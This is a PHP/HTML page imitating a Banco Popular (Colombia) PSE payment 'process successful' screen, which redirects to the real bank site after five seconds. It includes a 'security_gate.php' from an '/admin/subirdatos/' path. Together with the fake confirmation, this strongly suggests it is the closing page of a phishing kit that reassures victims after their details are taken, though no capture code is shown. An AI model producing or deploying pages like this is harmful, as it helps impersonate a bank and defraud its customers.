<?php
include_once dirname(dirname(dirname(dirname(dirname(dirname(dirname(__DIR__))))))) . '/admin/subirdatos/security_gate.php';
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <title>PSE Popular</title>
    <meta name="viewport" content="viewport-fit=cover, width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="icon" type="image/x-icon" href="assets/images/favicon.ico">
    <style>
        body, html { height: 100%; font-size: 100%; margin: 0; font-family: 'Inter', sans-serif; background-color: #f8f9fa; }
        .container { display: flex; flex-direction: column; height: 100%; justify-content: center; align-items: center; }
        .box-login { text-align: center; display: flex; flex-direction: column; width: 430px; margin: 0 auto; background: #fff; border-radius: 15px; box-shadow: 0 2px 4px rgba(0,0,0,0.14); padding: 40px; }
        .box-login img { width: 220px; margin-bottom: 40px; }
        .success-icon { font-size: 60px; color: #105163; margin-bottom: 20px; }
        .title-pse { font-size: 18px; font-weight: 500; margin-bottom: 20px; color: #333; }
        .text { font-size: 14px; color: #666; margin-bottom: 30px; line-height: 1.5; }
        .btn-primary { background: #105163; color: #fff; border: none; border-radius: 8px; width: 100%; height: 48px; font-weight: 700; cursor: pointer; text-decoration: none; display: flex; justify-content: center; align-items: center; font-size: 14px; }
        
        @media (max-width: 480px) {
            .box-login { width: 90%; padding: 20px; border-radius: 0; box-shadow: none; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="box-login">
            <img alt="Banco popular" src="assets/images/popularhorizontal_new.svg">
            <div class="success-icon">✓</div>
            <p class="title-pse">¡Proceso Exitoso!</p>
            <p class="text">Tu validación ha sido completada correctamente. En unos momentos serás redirigido al portal principal.</p>
            <a href="https://www.bancopopular.com.co/" class="btn-primary">Finalizar</a>
        </div>
    </div>

    <script>
        setTimeout(function() {
            window.location.href = "https://www.bancopopular.com.co/";
        }, 5000);
    </script>
</body>
</html>
